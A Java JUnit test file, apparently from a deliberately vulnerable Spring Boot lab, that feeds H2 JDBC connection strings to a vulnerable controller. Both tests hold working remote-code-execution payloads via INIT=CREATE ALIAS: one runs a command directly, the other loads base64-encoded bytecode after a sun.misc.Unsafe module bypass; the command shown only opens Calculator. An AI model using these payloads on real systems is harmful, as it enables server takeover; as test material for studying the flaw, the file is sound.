import com.reajason.javaweb.vul.springboot3.controller.JDBCController;
import org.junit.jupiter.api.Test;

/**
 * @author ReaJason
 * @since 2025/6/27
 */
public class JDBCTest {

    @Test
    void testJDBC() throws Exception {
        JDBCController jdbcController = new JDBCController();
        String funcionName = "testJDBC";
        String str = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS " + funcionName + " AS '" +
                "String shellexec(String abc) throws java.lang.Exception{" +
                "java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")\\;" +
                "return \"test\"\\;" +
                "}'\\;" +
                "CALL " + funcionName + "('123')";
        jdbcController.JDBC(str);
    }

    @Test
    void testJDBC2() throws Exception {
        JDBCController jdbcController = new JDBCController();
        String b64Bytecode = "yv66vgAAAD0AIAoAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClWCgAIAAkHAAoMAAsADAEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwgADgEAEm9wZW4gLWEgQ2FsY3VsYXRvcgoACAAQDAARABIBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7BwAUAQATamF2YS9pby9JT0V4Y2VwdGlvbgcAFgEAC0NvbW1hbmRFeGVjAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAA1MQ29tbWFuZEV4ZWM7AQAIPGNsaW5pdD4BAA1TdGFja01hcFRhYmxlAQAKU291cmNlRmlsZQEAEENvbW1hbmRFeGVjLmphdmEAIQAVAAIAAAAAAAIAAQAFAAYAAQAXAAAALwABAAEAAAAFKrcAAbEAAAACABgAAAAGAAEAAAAHABkAAAAMAAEAAAAFABoAGwAAAAgAHAAGAAEAFwAAAE8AAgABAAAADrgABxINtgAPV6cABEuxAAEAAAAJAAwAEwADABgAAAASAAQAAAAKAAkADQAMAAsADQAOABkAAAACAAAAHQAAAAcAAkwHABMAAAEAHgAAAAIAHw==";
        String str = "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS look AS '" +
                "String a(String a) throws java.lang.Throwable{" +
                "String base64Str=\"" + b64Bytecode + "\"\\;" +
                "byte[] bytes=java.util.Base64.getDecoder().decode(base64Str)\\;" +
                "try {" +
                "    java.lang.Class<?> unsafeClass = Class.forName(\"sun.misc.Unsafe\")\\;" +
                "    java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField(\"theUnsafe\")\\;" +
                "    unsafeField.setAccessible(true)\\;" +
                "    java.lang.Object unsafe = unsafeField.get(null)\\;" +
                "    java.lang.Object module = Class.class.getMethod(\"getModule\").invoke(java.lang.Object.class, (java.lang.Object[]) null)\\;" +
                "    java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod(\"objectFieldOffset\", java.lang.reflect.Field.class)\\;" +
                "    long offset = (Long) objectFieldOffsetM.invoke(unsafe, java.lang.Class.class.getDeclaredField(\"module\"))\\;" +
                "    java.lang.reflect.Method getAndSetObjectM = unsafe.getClass().getMethod(\"getAndSetObject\", java.lang.Object.class, long.class, java.lang.Object.class)\\;" +
                "    java.lang.StackTraceElement[] stackTraceElements = java.lang.Thread.currentThread().getStackTrace()\\;" +
                "    java.lang.Class<?> callerClass = java.lang.Class.forName(stackTraceElements[1].getClassName())\\;" +
                "    getAndSetObjectM.invoke(unsafe, callerClass, offset, module)\\;" +
                "} catch (Throwable e) {}" +
                "java.lang.reflect.Method defMethod=java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\",bytes.getClass(),int.class,int.class)\\;" +
                "defMethod.setAccessible(true)\\;" +
                "java.lang.Class myclass=(java.lang.Class)defMethod.invoke(java.lang.Thread.currentThread().getContextClassLoader(),bytes,0,bytes.length)\\;" +
                "myclass.newInstance()\\;" +
                "return null\\;" +
                "}'\\;" +
                "CALL look('')";
        System.out.println(str);
        jdbcController.JDBC(str);
    }
}
